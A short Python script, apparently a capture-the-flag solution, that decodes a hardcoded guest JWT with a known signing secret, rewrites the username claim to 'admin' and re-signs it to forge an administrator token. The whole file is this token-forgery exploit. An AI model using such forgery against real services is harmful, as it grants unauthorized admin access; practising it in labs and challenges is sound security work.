import jwt

def get_username_from_token():
    secret = "halloween-secret"
    token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0XzU4OTAiLCJpYXQiOjE3Mjk3OTU2MzZ9.CIK4Dr8RCYmrSArCJkrQbIv8AqhP0jCAtch4j_qYudQ'

    try:
        decoded = jwt.decode(token, secret, algorithms=["HS256"])
        decoded['username'] = 'admin'  # Set username to 'admin'
        new_token = jwt.encode(decoded, secret, algorithm="HS256")
        print(new_token)
    except jwt.ExpiredSignatureError:
        raise Exception("Token has expired.")
    except jwt.InvalidTokenError as err:
        raise Exception("Invalid token: " + str(err))

# Call the function
get_username_from_token()
